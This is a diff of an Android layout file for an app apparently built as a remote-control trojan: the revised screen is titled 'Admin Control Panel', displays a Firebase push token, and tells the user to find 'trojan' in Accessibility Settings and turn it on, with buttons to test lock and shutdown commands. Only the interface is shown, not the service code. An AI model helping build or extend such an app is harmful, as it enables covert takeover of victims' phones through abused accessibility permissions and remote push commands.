@@ -1,57 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     android:orientation="vertical"
-    android:gravity="center_horizontal"
-    android:padding="24dp"
-    tools:context=".MainActivity">
+    android:padding="16dp"
+    android:gravity="center_horizontal">
 
-    <!-- =============================================================== -->
-    <!-- ==                     START: NEW UI BLOCK                     == -->
-    <!-- =============================================================== -->
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="FCM Registration Token"
-        android:textStyle="bold"
-        android:textSize="18sp"/>
+        android:text="Admin Control Panel"
+        android:textSize="20sp"
+        android:textStyle="bold"/>
 
     <TextView
         android:id="@+id/tvFcmToken"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Waiting for FCM Token..."
-        android:gravity="center"
-        android:padding="8dp"
-        android:layout_marginTop="8dp"
-        android:textIsSelectable="true"/>
+        android:layout_marginTop="16dp"
+        android:text="Fetching token..."
+        android:textIsSelectable="true"
+        android:background="#ECECEC"
+        android:padding="8dp"/>
 
     <Button
-        android:id="@+id/btnCopyToken"
-        android:layout_width="wrap_content"
+        android:id="@+id/btnOpenAccessibility"
+        android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Copy Token"
-        android:layout_marginTop="8dp"
-        android:layout_marginBottom="32dp"/>
-    <!-- =============================================================== -->
-    <!-- ==                      END: NEW UI BLOCK                      == -->
-    <!-- =============================================================== -->
-
+        android:layout_marginTop="24dp"
+        android:text="1. Open Accessibility Settings"/>
 
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="Remote Actions"
-        android:textSize="22sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="24dp"/>
+        android:layout_marginTop="8dp"
+        android:text="Find 'trojan' in the list and turn it ON."/>
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Test Local Actions"
+        android:textSize="20sp"
+        android:layout_marginTop="32dp"
+        android:textStyle="bold"/>
 
     <Button
-        android:id="@+id/btnOpenAccessibilitySettings"
+        android:id="@+id/btnTestLock"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Enable Accessibility Service" />
+        android:layout_marginTop="16dp"
+        android:text="2. Test Lock Command"/>
+
+    <Button
+        android:id="@+id/btnTestShutdown"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="8dp"
+        android:text="3. Test Shutdown Command"/>
 
 </LinearLayout>
